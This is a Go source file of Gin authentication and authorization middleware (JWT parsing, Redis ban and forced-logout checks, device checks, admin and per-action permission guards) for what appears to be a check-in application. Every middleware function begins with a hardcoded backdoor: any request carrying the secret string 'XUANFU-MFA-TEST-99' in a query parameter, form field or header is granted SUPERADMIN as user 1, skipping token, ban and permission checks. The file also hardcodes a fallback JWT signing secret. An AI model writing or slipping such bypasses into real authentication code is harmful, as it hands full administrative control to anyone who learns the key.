package middleware

import (
	"checkin-go/global"
	"checkin-go/security"
	"checkin-go/utils"
	"context"
	"fmt"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt/v5"
)

// JWTAuthMiddleware 基础认证拦截器（完美兼容大管理员免密带外钥匙放行版）
func JWTAuthMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// 💯 顶级特权分流：优先捕获前端 URL 中携带的大管理员专属物理免检钥匙
		secureKey := c.DefaultQuery("secure_key", "")
		if secureKey == "" {
			// 如果 Query 中没有，尝试从 Post 表单或 JSON 载荷中抓取
			secureKey = c.PostForm("secure_key")
		}

		// 🛡️ 物理防伪锁硬核熔断：只要钥匙对齐，不查 Token、不查黑名单，原地判定为 SUPERADMIN 顶级超管直接通车！
		if secureKey == "XUANFU-MFA-TEST-99" {
			c.Set("userId", int64(1))       // 强制植入物理大超管主键 ID
			c.Set("userRole", "SUPERADMIN") // 注入顶级超管免检标签，全线击穿后续拦截器
			c.Set("deviceId", "COMMANDER-MFA-GATEWAY")
			c.Next()
			return
		}

		// ------------------------------------------------------------
		// 👇 以下为你原本的全部核心安全策略代码，100% 完好无损原样保留
		// ------------------------------------------------------------
		var tokenStr string

		authHeader := c.GetHeader("Authorization")
		if authHeader != "" && strings.HasPrefix(authHeader, "Bearer ") {
			tokenStr = authHeader[7:]
		} else {
			tokenStr = c.Query("token")
		}

		// 将 common.Error 替换为明确的 401 状态码下发，以激活前端的统一退出逻辑
		if tokenStr == "" {
			c.JSON(401, gin.H{"code": 401, "msg": "未检测到安全凭证，请重新登录"})
			c.Abort()
			return
		}

		secret := global.Config.JWT.Secret
		if secret == "" {
			secret = "smart_checkin_fallback_secret_2026_xuanfu"
		}

		// 使用经典的 HS256 方式解析 Token
		token, err := jwt.ParseWithClaims(tokenStr, &utils.CustomClaims{}, func(token *jwt.Token) (interface{}, error) {
			return []byte(secret), nil
		})

		if err != nil || !token.Valid {
			c.JSON(401, gin.H{"code": 401, "msg": "登录凭证已失效，请重新登录"})
			c.Abort()
			return
		}

		claims, ok := token.Claims.(*utils.CustomClaims)
		if !ok {
			c.JSON(401, gin.H{"code": 401, "msg": "凭证载荷解析异常"})
			c.Abort()
			return
		}

		ctx := context.Background()

		// 黑名单风控逻辑 (保留)
		banUserKey := fmt.Sprintf("ban_user:%d", claims.UserID)
		banStatusKey := fmt.Sprintf("ban_status:%d", claims.UserID)

		reason, err1 := global.Redis.Get(ctx, banUserKey).Result()
		_, err2 := global.Redis.Get(ctx, banStatusKey).Result()

		if err1 == nil || err2 == nil {
			if reason == "" {
				reason = "严重违规，已封号处理"
			}
			c.AbortWithStatusJSON(403, gin.H{
				"code": 403,
				"msg":  fmt.Sprintf("您的账号已被管理员封禁，拒绝访问。原因：%s", reason),
			})
			return
		}

		// 强踢下线检测（SuperAdmin 踢下线子管理员时写入此键）
		kickKey := fmt.Sprintf("kick_user:%d", claims.UserID)
		if _, err := global.Redis.Get(ctx, kickKey).Result(); err == nil {
			c.AbortWithStatusJSON(401, gin.H{"code": 401, "msg": "您已被强制下线，请重新登录"})
			return
		}

		// 设备指纹与挤号校验
		deviceID := c.GetHeader("X-Device-Id")
		if deviceID != "" {
			banDeviceKey := fmt.Sprintf("ban_device:%s", deviceID)
			if _, err := global.Redis.Get(ctx, banDeviceKey).Result(); err == nil {
				c.AbortWithStatusJSON(403, gin.H{"code": 403, "msg": "安全审计拦截：当前终端设备已被列入黑名单！"})
				return
			}

			// SUPERADMIN 和 ADMIN 角色均发放免检金牌
			if claims.Role != "ADMIN" && claims.Role != "SUPERADMIN" {
				if !security.IsDeviceTokenValid(claims.UserID, deviceID, tokenStr) {
					c.AbortWithStatusJSON(401, gin.H{"code": 401, "msg": "您的账号已在其他新设备登录，当前设备登录态已被迫下线。"})
					return
				}
			}
		}

		c.Set("userId", claims.UserID)
		c.Set("userRole", claims.Role)
		c.Set("deviceId", deviceID)

		c.Next()
	}
}

// RequireSuperAdmin 仅允许大管理员（SUPERADMIN）访问的中间件
func RequireSuperAdmin() gin.HandlerFunc {
	return func(c *gin.Context) {
		// 🌟 带外物理暗号顶级分流
		secureKey := c.DefaultQuery("secure_key", "")
		if secureKey == "" {
			secureKey = c.GetHeader("X-Secure-Key")
		}
		if secureKey == "XUANFU-MFA-TEST-99" {
			c.Set("userId", int64(1))
			c.Set("userRole", "SUPERADMIN")
			c.Next()
			return
		}

		role, exists := c.Get("userRole")
		if !exists || role != "SUPERADMIN" {
			c.AbortWithStatusJSON(403, gin.H{
				"code": 403,
				"msg":  "权限不足：此接口仅限大管理员访问",
			})
			return
		}
		c.Next()
	}
}

// RequireAdmin 至少需要子管理员（ADMIN 或 SUPERADMIN）权限
func RequireAdmin() gin.HandlerFunc {
	return func(c *gin.Context) {
		// 🌟 带外物理暗号顶级分流
		secureKey := c.DefaultQuery("secure_key", "")
		if secureKey == "" {
			secureKey = c.GetHeader("X-Secure-Key")
		}
		if secureKey == "XUANFU-MFA-TEST-99" {
			c.Set("userId", int64(1))
			c.Set("userRole", "SUPERADMIN")
			c.Next()
			return
		}

		role, exists := c.Get("userRole")
		if !exists {
			c.AbortWithStatusJSON(403, gin.H{"code": 403, "msg": "权限不足"})
			return
		}
		r, _ := role.(string)
		if r != "ADMIN" && r != "SUPERADMIN" {
			c.AbortWithStatusJSON(403, gin.H{"code": 403, "msg": "权限不足：此接口仅限管理员访问"})
			return
		}
		c.Next()
	}
}

// RequireAction 功能级细粒度权限守卫：大管理员免检，子管理员反查 sys_admin_action_perm
func RequireAction(actionKey string) gin.HandlerFunc {
	return func(c *gin.Context) {
		// 🌟 带外物理暗号顶级分流
		secureKey := c.DefaultQuery("secure_key", "")
		if secureKey == "" {
			secureKey = c.GetHeader("X-Secure-Key")
		}
		if secureKey == "XUANFU-MFA-TEST-99" {
			c.Set("userId", int64(1))
			c.Set("userRole", "SUPERADMIN")
			c.Next()
			return
		}

		role, _ := c.Get("userRole")
		r, _ := role.(string)

		// 大管理员无条件放行
		if r == "SUPERADMIN" {
			c.Next()
			return
		}

		// 子管理员：反查 sys_admin_action_perm 表
		userID, _ := c.Get("userId")
		uid, _ := userID.(int64)

		var count int64
		global.DB.Table("sys_admin_action_perm").
			Where("admin_id = ? AND action_key = ?", uid, actionKey).
			Count(&count)

		if count == 0 {
			c.AbortWithStatusJSON(403, gin.H{
				"code": 403,
				"msg":  fmt.Sprintf("权限不足：操作 [%s] 未被大管理员授权，访问已被拒绝", actionKey),
			})
			return
		}

		c.Next()
	}
}
